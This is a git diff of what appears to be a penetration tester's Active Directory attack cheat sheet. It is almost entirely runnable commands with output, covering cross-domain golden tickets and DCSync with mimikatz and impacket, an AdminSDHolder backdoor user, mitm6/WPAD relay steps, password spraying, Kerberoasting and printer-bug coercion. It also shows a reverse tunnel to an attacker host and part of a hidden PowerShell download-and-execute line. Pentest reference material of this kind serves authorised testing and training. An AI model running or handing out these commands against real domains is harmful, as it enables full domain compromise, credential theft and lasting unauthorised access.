+PdcRoleOwner            : DC01.child.megacorp.local
+RidRoleOwner            : DC01.child.megacorp.local
+InfrastructureRoleOwner : DC01.child.megacorp.local
+Name                    : child.megacorp.local
+
+PowerView2 > Invoke-MapDomainTrust
+
+SourceDomain         TargetDomain         TrustType   TrustDirection
+------------         ------------         ---------   --------------
+child.megacorp.local megacorp.local       ParentChild Bidirectional
+child.megacorp.local megacorp.com         External    Bidirectional
+megacorp.com         child.megacorp.local External    Bidirectional
+megacorp.local       child.megacorp.local ParentChild Bidirectional
+```
+
+Exploiting Bidirectional-ParentChild trust between child.megacorp.local <-> megacorp.local...
+
+For creating a cross-trust golden ticket we'll need:
+
+1. child domain FQDN (child.megacorp.local);
+2. name of the child domain's DC machine account and its RID (DC01$, 31337);
+3. the SID of the child domain (S-1-5-21-4266912945-3985045794-2943778634);
+4. the SID of the parent domain (S-1-5-21-2284550090-1208917427-1204316795);
+5. compomised krbtgt hash from the child domain (00ff00ff00ff00ff00ff00ff00ff00ff);
+6. ???
+7. PROFIT.
+
+```
+1.
+PS > $env:userdnsdomain
+child.megacorp.local
+
+2.
+PowerView2 > Get-NetComputer -FullData DC01.child.megacorp.local | Select ObjectSID
+S-1-5-21-4266912945-3985045794-2943778634-31337
+
+3.
+PowerView2 > Get-DomainSID
+S-1-5-21-4266912945-3985045794-2943778634
+
+4.
+PS > (New-Object System.Security.Principal.NTAccount("megacorp.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
+S-1-5-21-2284550090-1208917427-1204316795-502
+```
+
+Create cross-trust golden ticket:
+
+```
+mimikatz # kerberos::golden /domain:child.megacorp.local /user:DC01$ /id:31337 /groups:516 /sid:S-1-5-21-4266912945-3985045794-2943778634 /sids:S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 /krbtgt:00ff00ff00ff00ff00ff00ff00ff00ff /ptt
+Or
+$ ticketer.py -nthash 00ff00ff00ff00ff00ff00ff00ff00ff -user-id 31337 -groups 516 -domain child.megacorp.local -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -extra-sid S-1-5-21-2284550090-1208917427-1204316795-516,S-1-5-9 'DC01$'
+```
+
+For DCSyncing we'll need only parent domain FQDN (megacorp.local):
+
+```
+([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
+megacorp.local
+```
+
+DCSync:
+
+```
+mimikatz # lsadump::dcsync /user:megacorp.local\krbtgt /domain:megacorp.local
+```
+
+
+
+### UnD + PrinterBug
+
+* [www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/](https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/)
+* [posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
+* [github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#breaking-forest-trusts](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#breaking-forest-trusts)
+* [github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Spoolsample.ps1)
+* [github.com/BlackDiverX/WinTools/blob/master/SpoolSample-Printerbug/SpoolSample.exe](https://github.com/BlackDiverX/WinTools/blob/master/SpoolSample-Printerbug/SpoolSample.exe)
+
+
+
+### Visualization (yEd)
+
+* [www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/](http://www.harmj0y.net/blog/redteaming/domain-trusts-why-you-should-care/)
+* [github.com/HarmJ0y/TrustVisualizer](https://github.com/HarmJ0y/TrustVisualizer)
+* [www.yworks.com/products/yed](https://www.yworks.com/products/yed)
+
+```
+PowerView3 > Invoke-MapDomainTrust | Export-Csv -NoTypeInformation trusts.csv
+$ git clone https://github.com/HarmJ0y/TrustVisualizer
+$ python -m pip install networkx --proxy http://127.0.0.1:8090
+$ ./TrustVisualizer.py trusts.csv
+```
+
+
+
+
+## Persistence
+
+
+
+### Golden Ticket
+
+
+#### impacket
+
+```
+$ ticketer.py -nthash 00ff00ff00ff00ff00ff00ff00ff00ff -domain-sid S-1-5-21-4266912945-3985045794-2943778634 -domain megacorp.local snovvcrash
+$ export KRB5CCNAME=`pwd`/snovvcrash.ccache
+$ psexec.py megacorp.local/snovvcrash@DC01.megacorp.local -k -no-pass
+$ secretsdump.py megacorp.local/snovvcrash@DC01.megacorp.local -dc-ip 10.10.13.37 -just-dc-user 'MEGACORP\krbtgt' -k -no-pass
+```
+
+
+
+### AdminSDHolder Modification
+
+
+#### Create a Backdoor
+
+Add a new domain user or grant AdminCount to an existent domain user:
+
+```
+PS > net user snovvcrash Passw0rd! /domain /add
+PowerView3 > Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=megacorp,DC=local" -TargetDomain megacorp.local -PrincipalIdentity snovvcrash -PrincipalDomain megacorp.local -Rights All -Verbose
+```
+
+Check that granting AdminCount was successfull (may take 60+ minutes):
+
+```
+PowerView3 > Get-DomainUser snovvcrash | select objectsid
+S-1-5-21-2284550090-1208917427-1204316795-9824
+
+PowerView3 > Get-DomainObjectAcl -Identity "CN=AdminSDHolder,CN=System,DC=megacorp,DC=local" -Domain megacorp.local -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "S-1-5-21-2284550090-1208917427-1204316795-9824"}
+
+AceType               : AccessAllowed
+ObjectDN              : CN=AdminSDHolder,CN=System,DC=megacorp,DC=local
+ActiveDirectoryRights : GenericAll
+OpaqueLength          : 0
+ObjectSID             :
+InheritanceFlags      : None
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-2284550090-1208917427-1204316795-9824
+AccessMask            : 983551
+AuditFlags            : None
+AceFlags              : None
+AceQualifier          : AccessAllowed
+
+PowerView3 > Get-DomainUser snovvcrash | select admincount,memberof
+
+admincount memberof
+---------- --------
+         1 CN=Domain Admins,CN=Users,DC=megacorp,DC=local
+```
+
+Now you can add "snovvcrash" user to Domain Admins any time and do any stuff you want (actually adding the user to Domain Admins not even necessary, as the AdminCount is `1` anyways):
+
+```
+PowerView3 > Get-DomainObjectAcl -Identity "Domain Admins" -Domain megacorp.local -ResolveGUIDs | ? {$_.SecurityIdentifier -eq "S-1-5-21-2284550090-1208917427-1204316795-9824"}
+
+AceType               : AccessAllowed
+ObjectDN              : CN=Domain Admins,CN=Users,DC=megacorp,DC=local
+ActiveDirectoryRights : GenericAll
+OpaqueLength          : 0
+ObjectSID             : S-1-5-21-2284550090-1208917427-1204316795-512
+InheritanceFlags      : None
+BinaryLength          : 36
+IsInherited           : False
+IsCallback            : False
+PropagationFlags      : None
+SecurityIdentifier    : S-1-5-21-2284550090-1208917427-1204316795-9824
+AccessMask            : 983551
+AuditFlags            : None
+AceFlags              : None
+AceQualifier          : AccessAllowed
+
+PS > net group "Domain Admins" snovvcrash /domain /add
+...Do stuff...
+
+PS > net group "Domain Admins" snovvcrash /domain /del
+```
+
+
+#### Remove the Backdoor
+
+Disable or remove the account:
+
+```
+PS > net user snovvcrash /domain /active:no
+PS > net user snovvcrash /domain /del
+```
+
+Remove user AdminSDHolder container via GUI (ADUC).
+
+Clear the AdminCount (will be resetted if the user is still in AdminSDHolder container):
+
+```
+PowerView3 > Set-DomainObject -Identity testuser -Domain megacorp.local -Clear admincount -Verbose
+```
+
+
+
+
 ## Misc
 
 List all domain users:
@@ -571,15 +1512,11 @@ PS > Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' 
 PS > Get-ADObject -LDAPFilter "(objectClass=User)" -SearchBase '<DISTINGUISHED_NAME>' -IncludeDeletedObjects -Properties * |ft
 ```
 
-Naming convention:
-
-* [activedirectorypro.com/active-directory-user-naming-convention/](https://activedirectorypro.com/active-directory-user-naming-convention/)
 
 
 
 
-
-# Abuse Privileges
+# Privileges Abuse
 
 
 
@@ -976,7 +1913,7 @@ PS > ls -fo C:\Users\snovvcrash\AppData\Local\Microsoft\Credentials\
 * [www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/](https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/)
 * [clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/](https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/)
 
-Generate relay list with CME and enumerate local admins when relaying
+Generate relay list with cme and enumerate local admins when relaying
 
 ```
 $ crackmapexec smb 192.168.2.0/24 --gen-relay-list out.txt
@@ -1640,7 +2577,7 @@ bob@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd!'
 * [github.com/NotMedic/rdp-tunnel](https://github.com/NotMedic/rdp-tunnel)
 
 ```
-$ xfreerdp /u:snovvcrash /p:'Passw0rd!' /d:megacorp.local /v:PC001.megacorp.local /dynamic-resolution /drive:www,/home/snovvcrash/www +clipboard /rdp2tcp:/home/snovvcrash/tools/rdp-tunnel/rdp2tcp
+$ xfreerdp /u:snovvcrash /p:'Passw0rd!' /d:megacorp.local /v:PC01.megacorp.local /dynamic-resolution /drive:www,/home/snovvcrash/www +clipboard /rdp2tcp:/home/snovvcrash/tools/rdp-tunnel/rdp2tcp
 ```
 
 Reverse local port 9002 (on Victim) to local port 9001 on Attacker (good for reverse shells):
@@ -1979,7 +2916,7 @@ PS > $cred = New-Object System.Management.Automation.PSCredential('<HOSTNAME>\<U
 ##### Process.Start
 
 ```
-PS > $computer = "PC001"
+PS > $computer = "PC01"
 PS > [System.Diagnostics.Process]::Start("C:\Windows\System32\cmd.exe", "/c ping -n 1 10.10.13.37", $cred.Username, $cred.Password, $computer)
 ```
 
@@ -2705,6 +3642,20 @@ $ tcpdump -i eth0 -w dump.pcap -s0 'not tcp port 22' &
 
 * [research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
 
+##### Filters
+
+Broadcast/multicast, IPv6 packets:
+
+```
+ssdp || arp || llmnr || nbns || mdns || icmpv6 || dhcpv6
+```
+
+Arpspoof:
+
+```
+(http || ftp || smb || smb2 || ldap) && ip.src == VICTIM_10.0.0.5
+```
+
 
 
 ### LLMNR/NBNS Poisoning
@@ -2809,6 +3760,8 @@ Install:
 ```
 $ git clone https://github.com/fox-it/mitm6 ~/tools/mitm6 && cd ~/tools/mitm6
 $ python3 setup.py install
+Or
+$ pipx install "git+https://github.com/fox-it/mitm6.git" -f
 ```
 
 Run:
@@ -2822,6 +3775,23 @@ $ sort -u -t: -k1,1 ~/workspace/loot/net-ntlmv2.mitm6 >> ~/workspace/loot/net-nt
 
 $ cat ~/workspace/log/mitm6-smbserver.out | grep 'authenticated successfully' -A1 | grep aaaaaaaaaaaaaaaa | grep '\$' | cut -c 5- | sort -u -t: -k1,1
 ```
+
+##### Attack vectors
+
+Grab hashes with `smbserver.py` (passive):
+
+1. `mitm6.py` poisons IPv6 DNS entries for all hosts in the `/24` network.
+2. Victims start to use attacker's machine as the primary DNS server.
+3. `mitm6.py` on the attacker's machine acts like a rogue DNS server and responds with the attacker's IP for all incoming queries.
+4. `smbserver.py` collects hashes during SMB requests from victims.
+
+Relay authentication with ntlmrelayx.py (active):
+
+1. `mitm6.py` poisons IPv6 DNS entries for all hosts in the `/24` network.
+2. Victims start to use attacker's machine as the primary DNS server.
+3. `mitm6.py` on the attacker's machine acts like a rogue DNS server, `ntlmrelayx.py` serves a malicious WPAD file with an inexistent hostname (which will be resolved to the attacker's IP anyway) and acts like a rogue proxy server and `mitm6.py` responds with the attacker's IP for all the incoming DNS queries.
+4. Victims grab the WPAD file and ask the rogue IPv6 DNS server (attacker's machine) to resolve its location - resolved to attacker's machine.
+5. Victims go to the rogue proxy server and there `ntlmrelayx.py` responses with `HTTP 407 Proxy Authentication`.
 
 
 
@@ -2875,14 +3845,6 @@ $ grep 'Up' subnets/gateways.gnmap |cut -d' ' -f2 > subnets/ranges.txt
 
 $ sed -i subnets/ranges.txt -e 's/$/\/24/'
 ```
-
-Passive traffic analyze. Look for broadcast/multicast, IPv6 packets:
-
-* ARP
-* LLMNR, NBNS
-* STP
-* DHCPv6, ICMPv6
-* mDNS
 
 
 
@@ -3135,8 +4097,8 @@ Top UDP ports:
 | 3391 | RD Gateway |
 
 ```
-$ sudo masscan --rate=500 --open -p21,22,23,25,53,80,88,111,135,137,139,161,389,443,445,464,500,593,636,873,1099,1433,1521,2049,3268,3269,3306,3389,4786,5432,5555,5900,5985,5986,6379,8080,9389,9200,27017,U:161,U:500 -iL routes.txt --resume paused.conf >> alltcp.txt
-$ mkdir services && for p in 21 22 23 25 53 80 88 111 135 137 139 161 389 443 445 464 500 593 636 873 1099 1433 1521 2049 3268 3269 3306 3389 4786 5432 5555 5900 5985 5986 6379 8080 9389 9200 27017; do grep "port $p/tcp" alltcp.txt | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
+$ sudo masscan --rate=500 --open -p21,22,23,25,53,80,88,111,135,137,139,161,389,443,445,464,500,593,636,873,1099,1433,1521,2049,3268,3269,3306,3389,4786,5432,5555,5900,5985,5986,6379,8080,9389,9200,27017,U:161,U:500 -iL routes.txt --resume paused.conf >> masscan.out
+$ mkdir services && for p in 21 22 23 25 53 80 88 111 135 137 139 161 389 443 445 464 500 593 636 873 1099 1433 1521 2049 3268 3269 3306 3389 4786 5432 5555 5900 5985 5986 6379 8080 9389 9200 27017; do grep "port $p/tcp" masscan.out | awk -F' ' '{print $6}' | sort -u -t'.' -k1,1n -k2,2n -k3,3n -k4,4n > "services/port$p.txt"; done
 ```
 
 
@@ -3242,14 +4204,16 @@ msf > use auxiliary/scanner/netbios/nbname
 
 **CVE-2008-4250, MS08-067**
 
-Check:
+
+#### Check
 
 ```
 msf > use exploit/windows/smb/ms08_067_netapi
 msf > check
 ```
 
-Exploit:
+
+#### Exploit
 
 ```
 msf > use exploit/windows/smb/ms08_067_netapi
@@ -3262,13 +4226,15 @@ msf > exploit
 
 **CVE-2017-0144, MS17-010**
 
-Check:
+
+#### Check
 
 ```
 msf > use auxiliary/scanner/smb/smb_ms17_010
 ```
 
-Exploit:
+
+#### Exploit
 
 ```
 msf > exploit/windows/smb/ms17_010_eternalblue
@@ -3280,13 +4246,15 @@ msf > exploit/windows/smb/ms17_010_eternalblue
 
 **CVE-2019-0708**
 
-Check:
+
+#### Check
 
 ```
 msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce
 ```
 
-Exploit:
+
+#### Exploit
 
 ```
 msf > exploit/windows/rdp/cve_2019_0708_bluekeep_rce
@@ -3294,24 +4262,16 @@ msf > exploit/windows/rdp/cve_2019_0708_bluekeep_rce
 
 
 
-### Zerologon
 
-**CVE-2020-1472**
-
-* [github.com/SecuraBV/CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472)
-* [github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)
-* [github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472](https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472)
-
-
-
-
-## Generate Password List
+## Generate Wordlists
 
 
 
 ### hashcat
 
-Potentially valid users if got any, `John Doe` as an example:
+Potentially valid usernames, `John Doe` as an example:
+
+* [activedirectorypro.com/active-directory-user-naming-convention/](https://activedirectorypro.com/active-directory-user-naming-convention/)
 
 ```
 $ cat << EOF >> passwords.txt
@@ -3380,29 +4340,14 @@ $ hashcat --force --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule
 $ cp t passwords.txt
 ```
 
-Simple list for password spraying:
+
+
+### kwprocessor
+
+* [github.com/hashcat/kwprocessor](https://github.com/hashcat/kwprocessor)
 
 ```
-$ cat << EOF >> passwords.txt
-admin
-root
-changeme
-Password
-Password1
-Password!
-Password2020
-Password2020!
-Gfhjkm
-Gfhjkm1
-Gfhjkm!
-Gfhjkm2020
-Gfhjkm2020!
-Megacorp
-Megacorp1
-Megacorp!
-Megacorp2020
-Megacorp2020!
-EOF
+$ ./kwp basechars/full.base keymaps/en-us.keymap routes/2-to-16-max-3-direction-changes.route > passwords.txt
 ```
 
 
@@ -3417,25 +4362,6 @@ $ cewl -d 5 -m 5 -w passwords.txt --with-numbers --email_file emails.txt http://
 
 
 ## Tools
-
-
-
-### kerbrute
-
-* [github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
-
-```
-$ ./kerbrute -v --delay 100 -d megacorp.local -o kerbrute-passwordspray-123456.log passwordspray users.txt '123456'
-```
-
-
-### DomainPasswordSpray
-
-* [github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
-
-```
-PS > Invoke-DomainPasswordSpray -UserList .\users.txt -Domain megacorp.local -Password 'Passw0rd!' -OutFile spray-results.txt
-```
 
 
 
@@ -3470,12 +4396,34 @@ $ nullinux.py 127.0.0.1
 
 
 
+### kerbrute
+
+* [github.com/ropnop/kerbrute](https://github.com/ropnop/kerbrute)
+
+```
+$ ./kerbrute -v --delay 100 -d megacorp.local -o kerbrute-passwordspray-123456.log passwordspray users.txt '123456'
+```
+
+
+### DomainPasswordSpray
+
+* [github.com/dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
+
+```
+PS > Invoke-DomainPasswordSpray -UserList .\users.txt -Domain megacorp.local -Password 'Passw0rd!' -OutFile spray-results.txt
+```
+
+
+
 ### crowbar
 
 * [github.com/galkan/crowbar](https://github.com/galkan/crowbar)
 
+
+#### RDP
+
 ```
-$ crowbar -b rdp -s 192.168.1.0/24 -u snovvcrash -c 'Passw0rd!'
+$ crowbar -b rdp -s 192.168.1.0/24 -u snovvcrash -c 'Passw0rd!' -l ~/workspace/log/crowbar.log -o ~/workspace/log/crowbar.out
 ```
 
 
@@ -3497,30 +4445,6 @@ $ pipenv install -r requirements.txt && pipenv shell
 ```
 $ lookupsid.py MEGACORP/s.freeside:'Passw0rd!'@127.0.0.1 20000 | tee ~/workspace/log/lookupsid.out
 $ cat ~/workspace/log/lookupsid.out | grep SidTypeUser | grep -v '\$' | awk -F'\' '{print $2}' | awk '{print $1}' > ~/workspace/enum/allusers.txt
-```
-
-
-#### GetNPUsers.py
-
-```
-$ GetNPUsers.py MEGACORP/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.txt | tee GetNPUsers.log
-$ cat GetNPUsers.log | grep -v 'Client not found in Kerberos database'
-$ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=snovvcrash hashes/asprep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
-```
-
-
-#### GetUserSPNs.py
-
-```
-$ GetUserSPNs.py MEGACORP/s.freeside:'Passw0rd!' -dc-ip 127.0.0.1 -save
-$ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=snovvcrash hashes/tgsrep.txt seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
-```
-
-
-#### samrdump.py
-
-```
-$ samrdump.py 127.0.0.1
 ```
 
 
@@ -3555,16 +4479,16 @@ $ pipx run crackmapexec smb 127.0.0.1 -u 'anonymous' -p ''
 Use:
 
 ```
-$ CME smb 127.0.0.1
-$ CME smb 127.0.0.1 -u anonymous -p '' --shares
-$ CME smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
-$ CME smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd!' --shares [--continue-on-success]
-$ CME smb 127.0.0.1 -u snovvcrash -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
-$ CME smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
-$ CME smb 127.0.0.1 -u snovvcrash -p '' --local-auth --sam
-$ CME smb 127.0.0.1 -u snovvcrash -p '' -M spider_plus
-$ CME smb 127.0.0.1 -u snovvcrash -p '' -M mimikatz
-$ CME smb 127.0.0.1 -u snovvcrash -p '' -M lsassy
+$ cme smb 127.0.0.1
+$ cme smb 127.0.0.1 -u anonymous -p '' --shares
+$ cme smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
+$ cme smb 127.0.0.1 -u nullinux_users.txt -p 'Passw0rd!' --shares [--continue-on-success]
+$ cme smb 127.0.0.1 -u snovvcrash -p 'Passw0rd!' --spider-folder 'E\$' --pattern s3cret
+$ cme smb 127.0.0.1 -u j.doe -p 'Passw0rd!' -d 'CORP' --spider Users --pattern '.'
+$ cme smb 127.0.0.1 -u snovvcrash -p '' --local-auth --sam
+$ cme smb 127.0.0.1 -u snovvcrash -p '' -M spider_plus
+$ cme smb 127.0.0.1 -u snovvcrash -p '' -M mimikatz
+$ cme smb 127.0.0.1 -u snovvcrash -p '' -M lsassy
 ```
 
 
@@ -3665,7 +4589,7 @@ PS > powershell -NoP -sta -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebCl
 * [gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
 * [PowerView2.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1)
 * [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
-* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1) [\[New-GPOImmediateTask\]](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
+* [PowerView3.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122) [\[New-GPOImmediateTask\]](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
 * [PowerView4.ps1](https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1) [\[fork\]](https://exploit.ph/powerview.html)
 
 ```
@@ -3679,15 +4603,34 @@ PowerView3 > Invoke-Kerberoast -OutputFormat Hashcat | fl
 
 
 
+### dementor.py
+
+* [gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc)
+
+```
+$ ./dementor.py -d megacorp.local -u snovvcrash -p 'Passw0rd!' 10.10.13.37 DC01.megacorp.local
+```
+
+
+
+### printerbug.py
+
+* [https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
+
+```
+$ ./printerbug.py megacorp.local/snovvcrash:'Passw0rd!'@DC01.megacorp.local 10.10.13.37
+```
+
+
+
 ### cve-2019-1040-scanner
 
 * [github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py](https://github.com/fox-it/cve-2019-1040-scanner/blob/master/scan.py)
 
 ```
-$ python scan.py MEGACORP/snovvcrash:'Passw0rd!'@10.10.13.37
-$ python scan.py --target-file DCs.txt MEGACORP/snovvcrash:'Passw0rd!'
+$ ./scan.py MEGACORP/snovvcrash:'Passw0rd!'@10.10.13.37
+$ ./scan.py -target-file DCs.txt MEGACORP/snovvcrash:'Passw0rd!'
 ```
-
 
 
 
@@ -3781,7 +4724,6 @@ PS > [System.Diagnostics.FileVersionInfo]::GetVersionInfo($(Get-Item .\clr.dll))
 * [Pentesting AD](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/pentest_ad.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
 * [Pentesting Exchange](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/Pentesting_MS_Exchange_Server_on_the_Perimeter.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
 * [Abusing ACEs](https://raw.githubusercontent.com/Orange-Cyberdefense/arsenal/master/mindmap/ACEs_xmind.png) · [Orange-Cyberdefense/arsenal](https://github.com/Orange-Cyberdefense/arsenal)
-* [Kerberos Delegations](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-kerberos/kerberos-delegations) · [ShutdownRepo/The-Hacker-Recipes](https://github.com/ShutdownRepo/The-Hacker-Recipes)
 * [Pentesting Wi-Fi](https://raw.githubusercontent.com/koutto/pi-pwnbox-rogueap/main/mindmap/WiFi-Hacking-MindMap-v1.png) · [koutto/pi-pwnbox-rogueap](https://github.com/koutto/pi-pwnbox-rogueap)
 * [Pentesting Web Applications](https://miro.medium.com/max/2400/1*8lN7TaTnlZSPEikpHFQnuA.png) · [Chintan Gurjar](https://medium.com/@chintanfrogygurjar/professional-web-application-pentest-checklist-10ae5b2edbdd)
 
@@ -4152,7 +5094,7 @@ $ sudo reboot
 
 
 
-## Dirty Network Configure
+## Dirty Network Configurations
 
 Manually:
 
